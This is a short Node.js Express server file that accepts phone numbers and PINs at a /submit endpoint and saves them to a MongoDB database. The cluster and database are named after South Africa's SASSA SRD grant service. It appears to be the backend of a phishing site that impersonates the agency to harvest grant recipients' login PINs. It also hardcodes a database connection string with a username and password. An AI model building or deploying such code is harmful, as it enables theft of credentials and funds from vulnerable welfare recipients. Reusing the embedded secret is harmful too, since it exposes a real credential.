// server.js
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const Login = require('./models/Login'); // Correct model

const app = express();
app.use(cors());
app.use(express.json());

const MONGO_URI = process.env.MONGO_URI || 'mongodb+srv://mkasigiven09:yGiI6nmIj33vDrhk@srd-sassa-gov-za.qnutzho.mongodb.net/sassa';

mongoose.connect(MONGO_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
.then(() => console.log("✅ Connected to MongoDB"))
.catch(err => console.error("❌ MongoDB connection error:", err));

// ✅ Save login info (phone + pin)
app.post('/submit', async (req, res) => {
  try {
    const { number, pin } = req.body;

    if (!number || !pin) {
      return res.status(400).json({ message: "Number and PIN are required" });
    }

    const login = new Login({ number, pin });
    await login.save();

    return res.status(201).json({ message: "✅ Submitted successfully" });
  } catch (err) {
    console.error("❌ Error submitting:", err);
    return res.status(500).json({ message: "Internal server error" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));








